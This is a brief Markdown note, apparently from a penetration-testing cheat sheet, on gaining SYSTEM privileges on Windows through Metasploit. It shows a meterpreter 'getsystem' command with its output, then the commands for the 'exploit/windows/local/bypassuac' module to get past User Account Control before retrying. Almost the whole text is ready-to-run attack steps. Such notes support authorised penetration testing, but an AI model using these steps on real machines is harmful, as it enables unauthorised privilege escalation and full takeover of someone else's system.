# Bypass Windows User Account Control (UAC)

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

**If `getsystem` fails** when exploiting a _modern_ Windows system, it could be due to [User Account Control (UAC)](https://en.wikipedia.org/wiki/User_Account_Control). This can be bypassed with the post module `bypassuac`
```
use exploit/windows/local/bypassuac
set sessions <session-id>
run
```
then try `getsystem` again.
